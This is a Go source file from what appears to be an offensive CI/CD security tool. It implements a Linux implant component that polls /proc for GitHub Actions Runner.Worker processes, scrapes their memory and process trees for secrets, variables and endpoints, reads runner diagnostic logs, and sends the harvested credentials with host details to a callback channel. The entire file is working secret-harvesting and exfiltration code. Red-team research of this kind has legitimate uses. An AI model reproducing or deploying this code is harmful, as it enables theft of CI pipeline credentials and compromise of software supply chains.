// Copyright (C) 2026 boostsecurity.io
// SPDX-License-Identifier: AGPL-3.0-or-later

//go:build linux
// +build linux

package brisket

import (
	"context"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"sort"
	"strconv"
	"strings"
	"time"

	"github.com/boostsecurityio/smokedmeat/internal/models"
)

const (
	residentWatchInterval      = 50 * time.Millisecond
	residentHarvestRetryWindow = 20 * time.Second
)

var residentHarvestAttemptDelays = []time.Duration{
	250 * time.Millisecond,
	500 * time.Millisecond,
	1 * time.Second,
	2 * time.Second,
	3 * time.Second,
	5 * time.Second,
	8 * time.Second,
}

type residentWorkerProcess struct {
	PID       int
	Root      string
	StartTick string
	SeenAt    time.Time
}

func (a *Agent) startResidentJobWatcher(ctx context.Context) func() {
	if strings.TrimSpace(a.config.CallbackMode) != "resident" {
		return func() {}
	}
	watchCtx, cancel := context.WithCancel(ctx)
	go a.watchResidentJobs(watchCtx)
	return cancel
}

func (a *Agent) watchResidentJobs(ctx context.Context) {
	seen := make(map[string]time.Time)
	for _, worker := range residentWorkerProcesses() {
		seen[residentWorkerKey(worker)] = worker.SeenAt
	}
	ticker := time.NewTicker(residentWatchInterval)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			for _, worker := range residentWorkerProcesses() {
				key := residentWorkerKey(worker)
				if _, ok := seen[key]; ok {
					continue
				}
				seen[key] = worker.SeenAt
				go a.harvestResidentWorker(ctx, worker)
			}
			pruneResidentSeen(seen, time.Now().Add(-12*time.Hour))
		}
	}
}

func residentWorkerKey(worker residentWorkerProcess) string {
	key := worker.Root + ":" + worker.StartTick
	if key == ":" {
		key = fmt.Sprintf("%s:%d", worker.Root, worker.PID)
	}
	return key
}

func (a *Agent) harvestResidentWorker(ctx context.Context, worker residentWorkerProcess) {
	memdumpC := make(chan *MemDumpResult, 1)
	go func() {
		memdumpC <- a.dumpResidentWorkerSecrets(ctx, worker.PID)
	}()

	observed := models.ResidentJobObservation{
		Event:                models.ResidentJobEventObserved,
		SignalSource:         "runner_worker_process",
		RunnerRoot:           worker.Root,
		WorkerPID:            worker.PID,
		WorkerProcessStarted: worker.StartTick,
		ObservedAt:           worker.SeenAt,
		HarvestProfile:       models.ResidentJobHarvestProfileLite,
	}
	observed.JobKey = residentJobKey(observed)
	observed.WorkerLog = waitForResidentWorkerLog(ctx, worker.Root, worker.SeenAt)
	if observed.WorkerLog != "" {
		observed = parseResidentWorkerLog(observed.WorkerLog, observed)
	}
	_ = a.sendResidentJob(ctx, observed, nil)

	var memdump *MemDumpResult
	select {
	case memdump = <-memdumpC:
	case <-ctx.Done():
		return
	}
	observed = refreshResidentWorkerObservation(ctx, worker, observed)
	harvested := observed
	harvested.Event = models.ResidentJobEventHarvested
	harvested.HarvestedAt = time.Now().UTC()
	if memdump.Error != "" {
		harvested.Event = models.ResidentJobEventHarvestFailed
		harvested.Error = memdump.Error
	}
	_ = a.sendResidentJob(ctx, harvested, memdump)
}

func refreshResidentWorkerObservation(ctx context.Context, worker residentWorkerProcess, observed models.ResidentJobObservation) models.ResidentJobObservation {
	if observed.WorkerLog == "" || !residentWorkerLogHasAttribution(observed.WorkerLog) {
		observed.WorkerLog = waitForResidentWorkerLog(ctx, worker.Root, worker.SeenAt)
	}
	if observed.WorkerLog != "" {
		observed = parseResidentWorkerLog(observed.WorkerLog, observed)
	}
	return observed
}

func (a *Agent) dumpResidentWorkerSecrets(ctx context.Context, pid int) *MemDumpResult {
	deadline := time.NewTimer(residentHarvestRetryWindow)
	defer deadline.Stop()

	results := make(chan *MemDumpResult, len(residentHarvestAttemptDelays))
	for _, delay := range residentHarvestAttemptDelays {
		delay := delay
		go func() {
			if delay > 0 {
				timer := time.NewTimer(delay)
				defer timer.Stop()
				select {
				case <-ctx.Done():
					return
				case <-timer.C:
				}
			}
			results <- a.dumpResidentProcessTreeSecrets(pid, delay == 2*time.Second)
		}()
	}

	var empty *MemDumpResult
	var failed *MemDumpResult
	for remaining := len(residentHarvestAttemptDelays); remaining > 0; {
		select {
		case <-ctx.Done():
			return residentMemDumpFallback(pid, empty, failed)
		case <-deadline.C:
			return residentMemDumpFallback(pid, empty, failed)
		case result := <-results:
			remaining--
			if residentMemDumpHasData(result) {
				return result
			}
			if result != nil && result.Error == "" {
				empty = mergeResidentMemDumpStats(pid, empty, result)
			} else if result != nil {
				failed = mergeResidentMemDumpStats(pid, failed, result)
			}
		}
	}
	return residentMemDumpFallback(pid, empty, failed)
}

func (a *Agent) dumpResidentProcessTreeSecrets(pid int, includeRoot bool) *MemDumpResult {
	var empty *MemDumpResult
	var failed *MemDumpResult
	for _, candidate := range residentProcessTreePIDs(pid, includeRoot) {
		result := normalizeResidentMemDumpResult(candidate, a.DumpRunnerSecretsFromPID(candidate))
		if residentMemDumpHasData(result) {
			return result
		}
		if result != nil && result.Error == "" {
			empty = mergeResidentMemDumpStats(pid, empty, result)
		} else if result != nil {
			failed = mergeResidentMemDumpStats(pid, failed, result)
			if failed.Error == "" {
				failed.Error = result.Error
			}
		}
	}
	if empty == nil && failed == nil {
		return &MemDumpResult{ProcessID: pid, ScanAttempts: 1}
	}
	return residentMemDumpFallback(pid, empty, failed)
}

func normalizeResidentMemDumpResult(pid int, result *MemDumpResult) *MemDumpResult {
	if result == nil {
		return &MemDumpResult{ProcessID: pid, Error: "runner memory scan failed", ScanAttempts: 1, ProcessTargets: 1}
	}
	if result.ProcessID == 0 {
		result.ProcessID = pid
	}
	if result.ScanAttempts == 0 {
		result.ScanAttempts = 1
	}
	if result.ProcessTargets == 0 {
		result.ProcessTargets = 1
	}
	return result
}

func mergeResidentMemDumpStats(pid int, into, result *MemDumpResult) *MemDumpResult {
	if into == nil {
		into = &MemDumpResult{ProcessID: pid}
	}
	if into.Error == "" {
		into.Error = result.Error
	}
	into.RegionsScanned += result.RegionsScanned
	into.BytesRead += result.BytesRead
	into.ReadErrors += result.ReadErrors
	into.ScanAttempts += result.ScanAttempts
	into.ProcessTargets += result.ProcessTargets
	return into
}

func residentMemDumpHasData(result *MemDumpResult) bool {
	return result != nil && (len(result.Secrets) > 0 || len(result.Vars) > 0 || len(result.Endpoints) > 0)
}

func residentMemDumpFallback(pid int, empty, failed *MemDumpResult) *MemDumpResult {
	if empty != nil {
		empty.Error = "runner memory scan found no secrets"
		return empty
	}
	if failed != nil {
		return failed
	}
	return &MemDumpResult{ProcessID: pid, Error: "runner memory scan found no secrets"}
}

func (a *Agent) sendResidentJob(ctx context.Context, observed models.ResidentJobObservation, memdump *MemDumpResult) error {
	payload := map[string]any{
		"agent_id":      a.agentID,
		"session_id":    a.config.SessionID,
		"hostname":      a.hostname,
		"os":            runtime.GOOS,
		"arch":          runtime.GOARCH,
		"pid":           os.Getpid(),
		"callback_id":   a.config.CallbackID,
		"callback_mode": a.config.CallbackMode,
		"resident_job":  observed,
	}
	if memdump != nil {
		payload["goos"] = runtime.GOOS
		payload["memdump_attempted"] = true
		payload["memdump_error"] = memdump.Error
		payload["memdump_pid"] = memdump.ProcessID
		payload["memdump_count"] = len(memdump.Secrets)
		payload["memdump_regions"] = memdump.RegionsScanned
		payload["memdump_bytes"] = memdump.BytesRead
		payload["memdump_read_errors"] = memdump.ReadErrors
		payload["memdump_scan_attempts"] = memdump.ScanAttempts
		payload["memdump_process_targets"] = memdump.ProcessTargets
		if len(memdump.Secrets) > 0 {
			payload["runner_secrets"] = memdump.Secrets
			payload["runner_pid"] = memdump.ProcessID
		}
		if len(memdump.Vars) > 0 {
			payload["runner_vars"] = memdump.Vars
		}
		if len(memdump.Endpoints) > 0 {
			payload["runner_endpoints"] = memdump.Endpoints
		}
	}
	data, err := json.Marshal(payload)
	if err != nil {
		return err
	}
	return a.sendData(ctx, data)
}

func residentWorkerProcesses() []residentWorkerProcess {
	entries, err := filepath.Glob("/proc/[0-9]*")
	if err != nil {
		return nil
	}
	now := time.Now().UTC()
	workers := make([]residentWorkerProcess, 0)
	for _, entry := range entries {
		pid, err := strconv.Atoi(filepath.Base(entry))
		if err != nil {
			continue
		}
		exe, err := os.Readlink(filepath.Join(entry, "exe"))
		if err != nil || filepath.Base(exe) != "Runner.Worker" {
			continue
		}
		root := filepath.Dir(filepath.Dir(exe))
		if !residentRunnerRoot(root) {
			continue
		}
		workers = append(workers, residentWorkerProcess{
			PID:       pid,
			Root:      root,
			StartTick: residentProcessStartTick(pid),
			SeenAt:    now,
		})
	}
	return workers
}

func residentRunnerRoot(root string) bool {
	if root == "" {
		return false
	}
	if _, err := os.Stat(filepath.Join(root, "_diag")); err != nil {
		return false
	}
	if _, err := os.Stat(filepath.Join(root, "bin", "Runner.Listener")); err != nil {
		return false
	}
	return true
}

func residentProcessStartTick(pid int) string {
	data, err := os.ReadFile(fmt.Sprintf("/proc/%d/stat", pid))
	if err != nil {
		return ""
	}
	fields := strings.Fields(string(data))
	if len(fields) < 22 {
		return ""
	}
	return fields[21]
}

func residentProcessTreePIDs(root int, includeRoot bool) []int {
	parents := make(map[int]int)
	entries, err := filepath.Glob("/proc/[0-9]*")
	if err != nil {
		if includeRoot {
			return []int{root}
		}
		return nil
	}
	for _, entry := range entries {
		pid, err := strconv.Atoi(filepath.Base(entry))
		if err != nil {
			continue
		}
		ppid, ok := residentProcessParent(pid)
		if !ok {
			continue
		}
		parents[pid] = ppid
	}
	return residentProcessTreeFromParents(root, parents, includeRoot)
}

func residentProcessParent(pid int) (int, bool) {
	data, err := os.ReadFile(fmt.Sprintf("/proc/%d/stat", pid))
	if err != nil {
		return 0, false
	}
	text := string(data)
	idx := strings.LastIndex(text, ")")
	if idx < 0 || idx+1 >= len(text) {
		return 0, false
	}
	fields := strings.Fields(text[idx+1:])
	if len(fields) < 2 {
		return 0, false
	}
	ppid, err := strconv.Atoi(fields[1])
	return ppid, err == nil
}

func residentProcessTreeFromParents(root int, parents map[int]int, includeRoot bool) []int {
	children := make(map[int][]int)
	for pid, ppid := range parents {
		children[ppid] = append(children[ppid], pid)
	}
	for ppid := range children {
		sort.Ints(children[ppid])
	}

	pids := make([]int, 0, len(parents)+1)
	seen := make(map[int]bool)
	queue := append([]int(nil), children[root]...)
	for len(queue) > 0 {
		pid := queue[0]
		queue = queue[1:]
		if seen[pid] {
			continue
		}
		seen[pid] = true
		pids = append(pids, pid)
		queue = append(queue, children[pid]...)
	}
	if includeRoot {
		pids = append(pids, root)
	}
	return pids
}

func waitForResidentWorkerLog(ctx context.Context, root string, since time.Time) string {
	deadline := time.NewTimer(3 * time.Second)
	defer deadline.Stop()
	ticker := time.NewTicker(100 * time.Millisecond)
	defer ticker.Stop()

	var fallback string
	for {
		if path := newestResidentWorkerLog(root, since); path != "" {
			fallback = path
			if residentWorkerLogHasAttribution(path) {
				return path
			}
		}
		select {
		case <-ctx.Done():
			return fallback
		case <-deadline.C:
			return fallback
		case <-ticker.C:
		}
	}
}

func newestResidentWorkerLog(root string, since time.Time) string {
	entries, err := os.ReadDir(filepath.Join(root, "_diag"))
	if err != nil {
		return ""
	}
	var newest string
	var newestMod time.Time
	for _, entry := range entries {
		if entry.IsDir() || !strings.HasPrefix(entry.Name(), "Worker_") || !strings.HasSuffix(entry.Name(), ".log") {
			continue
		}
		info, err := entry.Info()
		if err != nil {
			continue
		}
		if info.ModTime().Before(since.Add(-10 * time.Second)) {
			continue
		}
		if newest == "" || info.ModTime().After(newestMod) {
			newest = filepath.Join(root, "_diag", entry.Name())
			newestMod = info.ModTime()
		}
	}
	return newest
}

func pruneResidentSeen(seen map[string]time.Time, before time.Time) {
	for key, ts := range seen {
		if ts.Before(before) {
			delete(seen, key)
		}
	}
}
